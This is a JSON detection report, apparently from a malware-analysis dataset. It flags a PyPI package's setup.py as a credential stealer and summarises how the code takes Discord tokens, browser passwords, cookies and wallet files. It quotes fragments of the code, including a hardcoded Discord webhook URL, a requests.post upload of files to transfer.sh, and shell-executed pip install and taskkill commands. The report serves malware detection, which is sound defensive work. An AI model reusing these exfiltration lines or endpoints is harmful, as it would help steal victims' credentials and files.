{
  "package_name": "786f7973da6e7a2574e7134027d5c294bff621cf",
  "total_matches": 8,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/786f7973da6e7a2574e7134027d5c294bff621cf/setup.py",
      "file_name": "setup.py",
      "detection_count": 8,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "This code is a credential stealer (stealer malware) targeting Discord tokens, browser passwords, cookies, and sensitive files. It collects tokens and credentials from various browsers and Discord installations, decrypts them, and exfiltrates the data to a hardcoded Discord webhook (https://discord.com/api/webhooks/1075015307749511168/zW0wmO7PoeePt7LvQtnGFt44j1dG2YmJwnzkhKsO5HeRUoQ_2ImSLyoLJP3TlKqGILWA). It also uploads files to transfer.sh for remote access. The code attempts to install missing dependencies, kills processes, and searches the victim's file system for files containing sensitive keywords. The presence of functions to decrypt browser-stored credentials, enumerate and zip wallet/Steam/other app data, and the exfiltration logic to external servers are all clear indicators of malicious intent.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "3",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "exec('')",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:3",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/786f7973da6e7a2574e7134027d5c294bff621cf/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "40",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "subprocess.Popen(f'{executable} -m pip install {modl[1]}', shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:40",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/786f7973da6e7a2574e7134027d5c294bff621cf/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "539",
          "type_description": "code-execution: found 3 source code matches",
          "code_snippet": "subprocess.Popen(f'taskkill /im {procc} /t /f', shell=True)",
          "full_match": "* This package is executing OS commands in the setup.py file at setup.py:539",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/786f7973da6e7a2574e7134027d5c294bff621cf/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "21",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "'https://discord.com/api/webhooks/1075015307749511168/zW0wmO7PoeePt7LvQtnGFt44j1dG2YmJwnzkhKsO5HeRUoQ_2ImSLyoLJP3TlKqGILWA'",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at setup.py:21",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/786f7973da6e7a2574e7134027d5c294bff621cf/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "29",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "ip = urlopen(Request('https://api.ipify.org')).read().decode().strip()",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at setup.py:29",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/786f7973da6e7a2574e7134027d5c294bff621cf/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "150",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "'https://discord.com/api/v6/users/@me/relationships', headers=",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at setup.py:150",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/786f7973da6e7a2574e7134027d5c294bff621cf/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "639",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "upload = requests.post('https://transfer.sh/', files=files)",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at setup.py:639",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/786f7973da6e7a2574e7134027d5c294bff621cf/setup.py",
          "relative_path": "setup.py"
        },
        {
          "line_number": "704",
          "type_description": "shady-links: found 5 source code matches",
          "code_snippet": "'[steam](https://steam.com)', '[discord](https://discord.com)',",
          "full_match": "* This package contains an URL to a domain with a suspicious extension at setup.py:704",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/obfuscation/unzip_malware/786f7973da6e7a2574e7134027d5c294bff621cf/setup.py",
          "relative_path": "setup.py"
        }
      ]
    }
  ]
}